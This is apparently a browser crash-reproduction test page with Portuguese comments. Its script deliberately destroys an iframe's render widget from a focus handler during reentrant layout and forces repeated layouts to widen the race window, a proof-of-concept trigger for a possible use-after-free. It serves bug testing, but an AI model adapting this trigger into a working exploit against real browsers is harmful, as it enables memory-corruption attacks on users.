<!DOCTYPE html>
<style>
  iframe { 
    content: url(); 
    zoom: 0.01;
    /* Dimensões que forçam recálculo constante */
    width: calc(100vw - 1px);
  }
</style>
<div id="log"></div>
<script>
  let crashed = false;

  onload = () => {
    document.documentElement.append(document.createElement('frameset'));

    const i0 = document.getElementById('i0');

    // Handler que destrói o RenderWidget durante o layout
    i0.onfocus = () => {
      location.hash = 'y';
      // Forçar destruição do widget durante re-layout reentrante
      const parent = i0.parentNode;
      parent.innerHTML = ''; // Remove iframe ? destroi RenderWidget
    };

    // MutationObserver para detectar mudanças causadas pelo crash prevenido
    const observer = new MutationObserver(() => {
      if (!crashed) {
        document.getElementById('log').textContent = 
          'DOM mutado durante layout - verificar crash';
      }
    });
    observer.observe(document.body, { childList: true, subtree: true });

    // Sequência do trigger:
    // 1. Hash change inicia navegação ? schedule de layout
    location.hash = 'x';

    // 2. Script async que foca o iframe durante o layout pendente
    //    Usa Promise (microtask) para garantir execução no momento certo
    const s0 = document.createElement('script');
    const cachesFallback = window.caches
      ? `caches.has('a').then(() => document.getElementById('i0').focus())`
      : `Promise.resolve().then(() => document.getElementById('i0').focus())`;
    s0.src = `data:text/javascript,${cachesFallback}`;
    document.head.append(s0);

    // 3. Forçar layout repetidamente para aumentar a janela de race condition
    let count = 0;
    const forceLayout = () => {
      if (count++ < 20 && !crashed) {
        i0.getBoundingClientRect(); // força layout síncrono ? updateWidgetPositions()
        requestAnimationFrame(forceLayout);
      }
    };
    requestAnimationFrame(forceLayout);

    // 4. Detector de sobrevivência
    setTimeout(() => {
      document.getElementById('log').textContent = crashed
        ? 'CRASH detectado'
        : 'PASS: sem crash nesta janela (code path pode não ter sido atingido)';
    }, 3000);
  };
</script>
<iframe id="i0"></iframe>
